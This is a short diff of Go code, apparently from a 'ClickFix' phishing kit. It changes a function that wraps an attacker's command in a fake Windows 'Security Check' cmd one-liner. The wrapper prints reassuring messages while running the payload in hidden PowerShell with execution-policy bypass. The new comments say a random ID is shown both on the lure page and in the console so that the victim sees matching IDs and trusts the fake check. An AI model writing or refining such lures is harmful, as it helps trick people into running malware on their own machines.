@@ -81,8 +81,10 @@ func wrapClickFixPayload(command string) string {
 		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
 		return command
 	}
-	// Wrap: legitimate-looking security verification with payload deep inside
-	return `cmd /c "title Windows Security Verification & color 0A & echo Running security check... & timeout /t 2 >nul & echo Analyzing system files... & timeout /t 1 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo Verification complete. & timeout /t 1 >nul & exit"`
+	// Wrap: legitimate-looking security verification with payload deep inside.
+	// {VID} is replaced at runtime by the template JS with the same random
+	// verification ID shown on the page — the victim sees matching IDs.
+	return `cmd /c "title Security Check {VID} & color 0A & echo Verifying system {VID}... & timeout /t 2 >nul & echo Analyzing files... & timeout /t 1 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo Check {VID} complete. & exit"`
 }
 
 // renderClickFix substitutes all placeholders:
